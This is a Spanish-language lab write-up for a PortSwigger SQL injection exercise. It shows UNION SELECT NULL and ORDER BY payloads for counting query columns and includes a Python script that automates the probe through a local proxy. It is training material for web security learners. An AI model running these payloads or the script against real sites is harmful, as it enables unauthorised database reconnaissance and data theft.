---
title: "03 SQLi UNION attack determining the number of columns returned by the query"
collection: publications
category: portswigger
permalink: publications/SQLi/03_SQL injection UNION attack, determining the number of columns returned by the query
excerpt: 'Este laboratorio contiene una vulnerabilidad de inyección SQL en el campo de categoría del filtro de productos. Esta vulnerabilidad puede explotarse mediante un ataque UNION para recuperar datos de otras tablas. Para resolver el laboratorio, realizamos un ataque de inyección SQL que determina el número de columnas que devuelve la consulta. Este es el primer paso de un ataque UNION de inyección SQL. Utilizaremos esta técnica en laboratorios posteriores para construir el ataque completo.'
date: 2024-12-01
#venue: 'Journal 1'
#slidesurl: 'http://academicpages.github.io/files/slides1.pdf'
#paperurl: 'http://academicpages.github.io/files/paper1.pdf'
citation: 'SQLi UNION attack determining the number of columns returned by the query'
---

![logo]({{site.url}}/images/SQLi/sqli-3/logo.png)

Lab-Link: <https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns>  
Dificultad: APPRENTICE  

## Descripción del laboratorio

![Descripción]({{site.url}}/images/SQLi/sqli-3/descripcion.png)

## Objetivo del laboratorio

Determinar el número de columnas devueltas por la consulta realizando un ataque de inyección SQL UNION que devuelva una fila adicional que contenga valores nulos.

## Query

![categorias]({{site.url}}/images/SQLi/sqli-3/categorias y url.png)

La consulta utilizada en el laboratorio tendrá un aspecto similar a

```sql
SELECT * FROM tabla WHERE category = '<CATEGORY>'
```

Comprobamos que es vulnerable a SQLi insertando en la url el parametro:

```sql
' --
```

![Comprobar]({{site.url}}/images/SQLi/sqli-3/comprobar.png)

## Determinar el numero de columnas retornadas por la consulta

1) El payload se veria asi con NULL:

```javascript
/filter?category=Gifts' UNION SELECT NULL--
/filter?category=Gifts' UNION SELECT NULL, NULL--
/filter?category=Gifts' UNION SELECT NULL, NULL, NULL--
```

Vamos insertando `NULL` con `UNION SELECT` para ver cuantas columnas estan disponibles etc...

2) Probamos con `ORDER BY` para ver que cantidad son vulnerables, vamos incrementando el numero

```javascript
/filter?category=Gifts' ORDER BY 1--
/filter?category=Gifts' ORDER BY 2--
/filter?category=Gifts' ORDER BY 3--
```

## Forma determinar con NULL

```javascript
filter?category=Gifts' UNION SELECT NULL,NULL,NULL--
```
La web para a realizar el `URL ENCONDE` y quedaria algo asi:

![url enconde]({{site.url}}/images/SQLi/sqli-3/NULL.png)

En BurpSuite se veria de la siguiente forma

![BurpSuite]({{site.url}}/images/SQLi/sqli-3/burp.png)

## Forma determinar con ORDER BY

```javascript
filter?category=Gifts' ORDER BY 3--
```
Sin Url Encode:

![url]({{site.url}}/images/SQLi/sqli-3/url.png)

El navegador hace `URL ENCONDE` y quedaria algo asi:

![url_enconde]({{site.url}}/images/SQLi/sqli-3/url encode.png)

Aprobado
![Aprobado]({{site.url}}/images/SQLi/sqli-3/aprobado.png)

# Codigo Python

```python
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli_column_number(url):
    path = "/filter?category=Gifts"
    for i in range(1,50):
        sql_payload = "'+order+by+%s--" %i
        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
        res = r.text
        if "Internal Server Error" in res:
            return i -1
        i = i + 1
    return False


if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print('[-] Usage: %s <url>' % sys.argv[0])
        print('[-] Example: %s www.example.com' % sys.argv[0])
        sys.exit(-1)

    print("[+] Figuring out number of columns...") 
    num_col = exploit_sqli_column_number(url)
    if num_col:
        print ("[+] The number of columns is " + str(num_col) + ".")
    else:
        print("[-] The SQLi attack was not successful.")
```